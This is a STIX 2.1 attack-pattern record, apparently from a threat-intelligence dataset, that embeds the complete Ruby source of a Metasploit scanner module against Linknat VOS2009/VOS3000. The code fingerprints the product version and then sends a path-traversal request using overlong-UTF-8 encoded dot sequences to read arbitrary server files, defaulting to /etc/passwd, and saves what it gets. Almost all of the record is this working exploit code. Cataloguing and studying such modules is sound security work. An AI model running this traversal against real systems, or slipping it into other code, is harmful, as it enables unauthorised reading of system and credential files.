{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--902b01ed-32f7-4cf2-a104-ddebdeff7dd8",
    "created": "2024-08-14T16:29:31.429565Z",
    "modified": "2024-08-14T16:29:31.42957Z",
    "name": "Linknat Vos Manager Traversal",
    "description": "( This module attempts to test whether a file traversal vulnerability is present in version of linknat vos2009/vos3000 ) 'References' => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/linknat_vos_traversal.rb",
            "external_id": "linknat_vos_traversal.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.wooyun.org/bugs/wooyun-2010-0145458"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Report\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Scanner\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'Linknat Vos Manager Traversal',\n      'Description' => %q(\n        This module attempts to test whether a file traversal vulnerability\n        is present in version of linknat vos2009/vos3000\n      ),\n      'References' => [\n        ['URL', 'http://www.linknat.com/'],\n        ['URL', 'http://www.wooyun.org/bugs/wooyun-2010-0145458']\n      ],\n      'Author'         => ['Nixawk'],\n      'License'        => MSF_LICENSE))\n\n    register_options(\n      [\n        Opt::RPORT(80),\n        OptString.new('TARGETURI', [true, 'The path of Linknat Vos Manager (/chs/, /cht/, /eng/)', '/eng/']),\n        OptString.new('FILEPATH', [true, 'The path to the file to read', '/etc/passwd']),\n        OptInt.new('TRAVERSAL_DEPTH', [true, 'Traversal depth', 5])\n      ])\n  end\n\n  def vos_uri(path)\n    full_uri =~ %r{/$} ? \"#{full_uri}#{path}\" : \"#{full_uri}/#{path}\"\n  end\n\n  def vos_version\n    case target_uri.to_s\n    when /chs/i\n      js_uri = vos_uri('js/lang_zh_cn.js')\n    when /cht/i\n      js_uri = vos_uri('js/lang_zh_tw.js')\n    when /eng/i\n      js_uri = vos_uri('js/lang_en_us.js')\n    else\n      print_warning(\"#{full_uri} - Please identify VOS version manually\")\n      return\n    end\n\n    res = send_request_cgi('uri' => js_uri)\n    return unless res\n\n    vprint_status(\"#{js_uri} - HTTP/#{res.proto} #{res.code} #{res.message}\")\n\n    return unless res.code == 200\n    res.body =~ /s\\[8\\] = \\\"([^\"]*)\\\"/m ? major = $1 : major = nil\n    res.body =~ /s\\[169\\] = \\\"[^:]*: ([^\"\\\\]*)\\\"/m ? minor = $1 : minor = nil\n    \"#{major} #{minor}\"\n  end\n\n  def run_host(ip)\n    version = vos_version\n    unless version\n      print_error(\"#{full_uri} - Failed to identify Linknat VOS\")\n      return\n    end\n\n    traversal = '/%c0%ae%c0%ae' * datastore['TRAVERSAL_DEPTH']\n    filename = datastore['FILEPATH']\n\n    uri = normalize_uri(target_uri.path, '..', traversal, filename)\n    res = send_request_cgi(\n      'method'  => 'GET',\n      'uri'     => uri\n    )\n\n    if res && res.code == 200\n      path = store_loot(\n        version,\n        'text/plain',\n        ip,\n        res.body,\n        filename)\n      print_good(\"#{full_uri} - File saved in: #{path}\")\n    else\n      print_error(\"#{full_uri} - Nothing was downloaded\")\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        "[Nixawk]",
        ""
    ]
}